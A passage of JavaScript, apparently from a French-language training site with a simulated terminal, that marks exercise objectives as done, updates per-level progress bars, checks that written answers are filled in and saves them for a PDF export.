                const el = document.querySelector(`[data-obj="${id}"]`);
                if (el) {
                    el.classList.add('completed');
                    el.querySelector('.obj-check').textContent = '✓';
                }

                this.printSuccess(`\n✅ Objectif validé : ${el ? el.querySelector('.obj-text').textContent : id}`);

                // Save terminal answer to state for PDF
                if (typeof state !== 'undefined' && state.examAnswers) {
                    if (!state.examAnswers.terminalAnswers) state.examAnswers.terminalAnswers = {};
                    if (!state.examAnswers.terminalAnswers[this.level]) state.examAnswers.terminalAnswers[this.level] = {};
                    state.examAnswers.terminalAnswers[this.level][id] = {
                        label: obj.label || id,
                        command: cmdLine
                    };
                    if (typeof saveState === 'function') saveState();
                }
            }
        }

        if (changed) {
            this.updateProgress();
            this.checkLevelComplete();
        }
    }

    updateProgress() {
        const levelObj = LEVEL_OBJECTIVES[this.level];
        if (!levelObj) return;

        const validated = Object.values(levelObj.objectives).filter(o => o.validated).length;
        const total = levelObj.total;

        const fill = document.getElementById('progress-' + this.level);
        const text = document.getElementById('progress-text-' + this.level);
        if (fill) fill.style.width = ((validated / total) * 100) + '%';
        if (text) text.textContent = validated + ' / ' + total;
    }

    checkLevelComplete() {
        const levelObj = LEVEL_OBJECTIVES[this.level];
        if (!levelObj) return;

        const allObjDone = Object.values(levelObj.objectives).every(o => o.validated);

        // Check text answers for this level
        const textareas = document.querySelectorAll(`.level-answer[data-level="${this.level}"]`);
        const totalAnswers = textareas.length;
        const filledAnswers = Array.from(textareas).filter(ta => ta.value.trim().length > 0).length;
        const allFilled = totalAnswers === 0 || filledAnswers === totalAnswers;

        if (allObjDone && allFilled) {
            this.printSuccess('\n🎉 TOUS LES OBJECTIFS ET RÉPONSES DU NIVEAU SONT COMPLÉTÉS !');
            
            // Save text answers
            if (typeof saveTextAnswers === 'function') {
                saveTextAnswers(this.level);
            }

            // Call completeLevel from app.js
            if (typeof completeLevel === 'function') {
                completeLevel(this.level);
            }
        } else if (allObjDone && !allFilled) {
            const remaining = totalAnswers - filledAnswers;
            this.printWarning(`\n⚠️ Objectifs terminaux validés, mais ${remaining} réponse(s) écrite(s) manquante(s). Remplissez toutes les questions pour compléter le niveau.`);
        }
    }
}

// ── RESTORE OBJECTIVES ON LOAD ────────────────────────────
function restoreObjectives() {
    for (const [level, data] of Object.entries(LEVEL_OBJECTIVES)) {
        let validated = 0;
        for (const [id, obj] of Object.entries(data.objectives)) {
            if (obj.validated) {
                validated++;
                const el = document.querySelector(`[data-obj="${id}"]`);
                if (el) {
                    el.classList.add('completed');
                    el.querySelector('.obj-check').textContent = '✓';
                }
            }
        }
        const fill = document.getElementById('progress-' + level);
        const text = document.getElementById('progress-text-' + level);
        if (fill) fill.style.width = ((validated / data.total) * 100) + '%';
        if (text) text.textContent = validated + ' / ' + data.total;
    }
}

// ── INITIALIZATION ────────────────────────────────────────
function initTerminals() {
    const terminals = document.querySelectorAll('.sim-terminal');
    terminals.forEach(container => {
        const level = container.dataset.level;
        if (level) {
            new SimulatedTerminal(container, level);
        }
    });
    restoreObjectives();
}
